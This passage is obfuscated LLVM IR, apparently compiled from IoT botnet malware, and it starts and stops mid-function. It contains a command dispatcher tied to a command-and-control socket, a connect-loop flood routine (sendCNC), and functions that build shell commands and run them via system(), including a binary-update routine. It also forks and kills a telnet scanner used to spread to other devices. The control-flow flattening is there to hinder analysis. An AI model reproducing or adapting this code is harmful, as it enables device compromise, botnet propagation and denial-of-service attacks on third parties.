  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.501, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #2
  store i32 0, i32* %15, align 4
  %switchVar = alloca i32
  store i32 -1415313377, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1415313377, label %38
    i32 -2040491034, label %43
    i32 -235436861, label %47
    i32 -1546772829, label %48
    i32 -1462987163, label %53
    i32 -749440895, label %60
    i32 -663716747, label %68
    i32 -1006663715, label %69
    i32 1088331188, label %70
    i32 -353257462, label %71
    i32 -1723640341, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %15, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  %42 = select i1 %41, i32 -2040491034, i32 -1723640341
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i32 @fork() #2
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -235436861, i32 1088331188
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1546772829, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %16, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  %52 = select i1 %51, i32 -1462987163, i32 -1006663715
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %7, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -749440895, i32 -663716747
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %18, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #10
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %18, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -663716747, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1546772829, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @_exit(i32 1) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 -353257462, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %15, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %15, align 4
  store i32 -1415313377, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %60, %53, %48, %47, %43, %38, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @senditbudAMP(i8*, i8*, i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca [128 x i8], align 16
  %12 = alloca [128 x i8], align 16
  %13 = alloca [128 x i8], align 16
  %14 = alloca [128 x i8], align 16
  %15 = alloca [128 x i8], align 16
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @strcmp(i8* %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 198541824, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 198541824, label %first
    i32 818987404, label %20
    i32 927528146, label %28
    i32 -1214288502, label %33
    i32 723899534, label %41
    i32 -1093824181, label %46
    i32 -1229787992, label %54
    i32 -1546525148, label %59
    i32 1301707030, label %67
    i32 -1675357035, label %72
    i32 952734802, label %80
    i32 -471598446, label %85
    i32 -1196455902, label %93
    i32 819761259, label %98
    i32 1512841638, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp ne i32 %.reload, 0
  %19 = select i1 %18, i32 927528146, i32 818987404
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %22 = load i8*, i8** %6, align 8
  %23 = load i8*, i8** %7, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %21, i64 128, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.503, i32 0, i32 0), i8* %22, i8* %23, i8* %24) #2
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %27 = call i32 @system(i8* %26)
  store i32 927528146, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i8*, i8** %5, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  %32 = select i1 %31, i32 723899534, i32 -1214288502
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %35 = load i8*, i8** %6, align 8
  %36 = load i8*, i8** %7, align 8
  %37 = load i8*, i8** %8, align 8
  %38 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %34, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.505, i32 0, i32 0), i8* %35, i8* %36, i8* %37) #2
  %39 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %40 = call i32 @system(i8* %39)
  store i32 723899534, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %5, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1229787992, i32 -1093824181
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = load i8*, i8** %8, align 8
  %51 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %47, i64 128, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.507, i32 0, i32 0), i8* %48, i8* %49, i8* %50) #2
  %52 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %53 = call i32 @system(i8* %52)
  store i32 -1229787992, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8*, i8** %5, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 1301707030, i32 -1546525148
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %61 = load i8*, i8** %6, align 8
  %62 = load i8*, i8** %7, align 8
  %63 = load i8*, i8** %8, align 8
  %64 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %60, i64 128, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.509, i32 0, i32 0), i8* %61, i8* %62, i8* %63) #2
  %65 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %66 = call i32 @system(i8* %65)
  store i32 1301707030, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %5, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  %71 = select i1 %70, i32 952734802, i32 -1675357035
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %7, align 8
  %76 = load i8*, i8** %8, align 8
  %77 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %73, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.511, i32 0, i32 0), i8* %74, i8* %75, i8* %76) #2
  %78 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %79 = call i32 @system(i8* %78)
  store i32 952734802, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i8*, i8** %5, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  %84 = select i1 %83, i32 -1196455902, i32 -471598446
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %87 = load i8*, i8** %6, align 8
  %88 = load i8*, i8** %7, align 8
  %89 = load i8*, i8** %8, align 8
  %90 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %86, i64 128, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.513, i32 0, i32 0), i8* %87, i8* %88, i8* %89) #2
  %91 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %92 = call i32 @system(i8* %91)
  store i32 -1196455902, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8*, i8** %5, align 8
  %95 = call i32 @strcmp(i8* %94, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %96 = icmp ne i32 %95, 0
  %97 = select i1 %96, i32 1512841638, i32 819761259
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %100 = load i8*, i8** %6, align 8
  %101 = load i8*, i8** %7, align 8
  %102 = load i8*, i8** %8, align 8
  %103 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %99, i64 128, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.515, i32 0, i32 0), i8* %100, i8* %101, i8* %102) #2
  %104 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %105 = call i32 @system(i8* %104)
  store i32 1512841638, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %98, %93, %85, %80, %72, %67, %59, %54, %46, %41, %33, %28, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %switchVar = alloca i32
  store i32 -1742650534, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1742650534, label %22
    i32 63005671, label %27
    i32 1241056335, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  %26 = select i1 %25, i32 63005671, i32 1241056335
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %28, i32* %8, align 4
  %29 = load i32, i32* %8, align 4
  %30 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 16)
  %32 = call i32 @sleep(i32 1)
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  store i32 -1742650534, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %27, %22, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -118641948, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -118641948, label %first
    i32 190270806, label %5
    i32 -1402791105, label %8
    i32 1678502560, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp eq i32 %.reload, 0
  %4 = select i1 %3, i32 190270806, i32 -1402791105
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = call i32 @system(i8* getelementptr inbounds ([439 x i8], [439 x i8]* @.str.516, i32 0, i32 0))
  %7 = call i32 @sleep(i32 20)
  store i32 1678502560, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %1, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.517, i32 0, i32 0), i32 %9)
  store i32 1678502560, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %5, %first, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  store i32 %60, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 448832181, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 448832181, label %first
    i32 -71421029, label %63
    i32 309543663, label %64
    i32 2032837261, label %71
    i32 -530479712, label %72
    i32 -1461981834, label %79
    i32 -1503171555, label %80
    i32 1233375148, label %87
    i32 -1698549851, label %94
    i32 1182777142, label %98
    i32 948642480, label %99
    i32 -268954076, label %104
    i32 1561372778, label %111
    i32 2128931390, label %115
    i32 1259353203, label %116
    i32 -792837108, label %121
    i32 1319197143, label %123
    i32 -618189609, label %127
    i32 609124422, label %128
    i32 1703296046, label %129
    i32 1773322151, label %136
    i32 1005646064, label %137
    i32 -1344209108, label %144
    i32 310348205, label %148
    i32 962222481, label %153
    i32 -566057786, label %154
    i32 64593833, label %161
    i32 -817220988, label %162
    i32 1787156359, label %169
    i32 2101402777, label %176
    i32 1162605441, label %180
    i32 1289302107, label %181
    i32 1499681875, label %203
    i32 -1083715251, label %210
    i32 147429181, label %214
    i32 572970616, label %215
    i32 -149526696, label %237
    i32 182928911, label %244
    i32 1573254639, label %248
    i32 507399379, label %249
    i32 -335820615, label %271
    i32 -231117671, label %278
    i32 -984877799, label %282
    i32 -1350028215, label %283
    i32 322000241, label %305
    i32 864170672, label %312
    i32 -2066528545, label %316
    i32 115988944, label %317
    i32 913882095, label %339
    i32 1726999039, label %346
    i32 -1349190725, label %350
    i32 1909924288, label %351
    i32 -175878709, label %373
    i32 1692785483, label %380
    i32 1533222823, label %384
    i32 -1174493030, label %385
    i32 -268563312, label %407
    i32 -1977080516, label %408
    i32 -1988791435, label %415
    i32 -2057446108, label %419
    i32 -78627862, label %426
    i32 -1461635036, label %433
    i32 -1730755760, label %440
    i32 -1910010762, label %447
    i32 -1196989918, label %454
    i32 112515966, label %461
    i32 924486306, label %468
    i32 -1210776666, label %472
    i32 -508155300, label %479
    i32 -146265339, label %480
    i32 -15953523, label %503
    i32 24004979, label %508
    i32 1051509545, label %509
    i32 279050986, label %513
    i32 639193375, label %518
    i32 2036534373, label %519
    i32 869896831, label %523
    i32 239638838, label %528
    i32 1753532434, label %529
    i32 -1986797399, label %534
    i32 -1393794854, label %537
    i32 152896909, label %541
    i32 1798537138, label %545
    i32 -371639868, label %554
    i32 -1608436969, label %556
    i32 -458985734, label %557
    i32 509477234, label %561
    i32 -172217930, label %570
    i32 -366073180, label %571
    i32 -2118156089, label %572
    i32 219694933, label %579
    i32 -972076140, label %583
    i32 -29496274, label %590
    i32 1635548201, label %597
    i32 1025537899, label %604
    i32 -444097885, label %611
    i32 1624044311, label %615
    i32 385830592, label %622
    i32 -1188526612, label %626
    i32 1657604929, label %633
    i32 1612263320, label %634
    i32 -1535220237, label %656
    i32 -1358532085, label %661
    i32 894691115, label %662
    i32 -97336191, label %666
    i32 1601621884, label %671
    i32 -382722082, label %672
    i32 -421605639, label %677
    i32 -206790261, label %680
    i32 -1787095151, label %684
    i32 -1665737454, label %688
    i32 -1411514093, label %696
    i32 -1197001678, label %698
    i32 1461792194, label %699
    i32 663155560, label %703
    i32 1130200024, label %711
    i32 652102228, label %712
    i32 1028203205, label %713
    i32 -651235261, label %720
    i32 -1140832382, label %724
    i32 -781875812, label %725
    i32 -1772471890, label %732
    i32 309285498, label %737
    i32 -1928704652, label %741
    i32 1407466383, label %745
    i32 1069316315, label %768
    i32 -1062981962, label %770
    i32 -110857905, label %771
    i32 186645046, label %775
    i32 -1578058161, label %776
    i32 -55457251, label %799
    i32 1321309365, label %800
    i32 418771310, label %807
    i32 -905491481, label %811
    i32 -116221269, label %818
    i32 1464614058, label %825
    i32 -964177942, label %826
    i32 -1086779890, label %842
    i32 -1160974028, label %845
    i32 649599254, label %849
    i32 593799310, label %853
    i32 -804384504, label %859
    i32 -2073392312, label %861
    i32 488281592, label %862
    i32 413857173, label %866
    i32 -725799605, label %867
    i32 2018689460, label %871
    i32 -2092976722, label %872
    i32 1276038129, label %879
    i32 -1031901392, label %883
    i32 1823108326, label %890
    i32 -1095046152, label %897
    i32 -621969226, label %898
    i32 383164078, label %914
    i32 -1965886964, label %917
    i32 2045513523, label %921
    i32 -524196663, label %925
    i32 15438023, label %929
    i32 360423163, label %931
    i32 431683507, label %932
    i32 776803993, label %936
    i32 -1192670649, label %937
    i32 -692928319, label %941
    i32 -96096008, label %942
    i32 1661510266, label %949
    i32 -207769032, label %950
    i32 817770804, label %955
    i32 1111415679, label %962
    i32 -1286672765, label %970
    i32 1200270716, label %978
    i32 171492976, label %979
    i32 -358312445, label %982
    i32 1153960891, label %986
    i32 382664979, label %990
    i32 -1386992580, label %993
    i32 1647802241, label %994
    i32 -454565221, label %1001
    i32 980613711, label %1002
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %61 = icmp ne i32 %.reload, 0
  %62 = select i1 %61, i32 309543663, i32 -71421029
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 0
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i32 0, i32 0)) #10
  %69 = icmp ne i32 %68, 0
  %70 = select i1 %69, i32 -530479712, i32 2032837261
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 0
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.519, i32 0, i32 0)) #10
  %77 = icmp ne i32 %76, 0
  %78 = select i1 %77, i32 -1503171555, i32 -1461981834
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  call void (i32, ...) bitcast (void ()* @UpdateBins to void (i32, ...)*)(i32 1)
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 0
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @strcmp(i8* %83, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.520, i32 0, i32 0)) #10
  %85 = icmp ne i32 %84, 0
  %86 = select i1 %85, i32 1005646064, i32 1233375148
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8**, i8*** %4, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.521, i32 0, i32 0)) #10
  %92 = icmp ne i32 %91, 0
  %93 = select i1 %92, i32 -268954076, i32 -1698549851
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* @scanPid, align 4
  %96 = icmp eq i32 %95, 0
  %97 = select i1 %96, i32 1182777142, i32 948642480
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* @scanPid, align 4
  %101 = call i32 @kill(i32 %100, i32 9) #2
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = call i32 (i32, i8*, ...) @sockprintf(i32 %102, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  store i32 -268954076, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8**, i8*** %4, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 1
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 @strcmp(i8* %107, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i32 0, i32 0)) #10
  %109 = icmp ne i32 %108, 0
  %110 = select i1 %109, i32 1773322151, i32 1561372778
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* @scanPid, align 4
  %113 = icmp ne i32 %112, 0
  %114 = select i1 %113, i32 2128931390, i32 1259353203
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @fork() #2
  store i32 %117, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %118 = load i32, i32* %5, align 4
  %119 = icmp ugt i32 %118, 0
  %120 = select i1 %119, i32 -792837108, i32 1319197143
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %5, align 4
  store i32 %122, i32* @scanPid, align 4
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %5, align 4
  %125 = icmp eq i32 %124, -1
  %126 = select i1 %125, i32 -618189609, i32 609124422
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 1703296046, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %132 = call i8* @inet_ntoa(i32 %131) #2
  %133 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i32 0, i32 0), i8* %132)
  %134 = load i32, i32* %7, align 4
  %135 = load i32, i32* %6, align 4
  call void @TelnetScanner(i32 %134, i32 %135)
  call void @_exit(i32 0) #12
  unreachable

; <label>:136:                                    ; preds = %loopEntry
  store i32 1005646064, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 0
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @strcmp(i8* %140, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.525, i32 0, i32 0)) #10
  %142 = icmp ne i32 %141, 0
  %143 = select i1 %142, i32 -566057786, i32 -1344209108
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
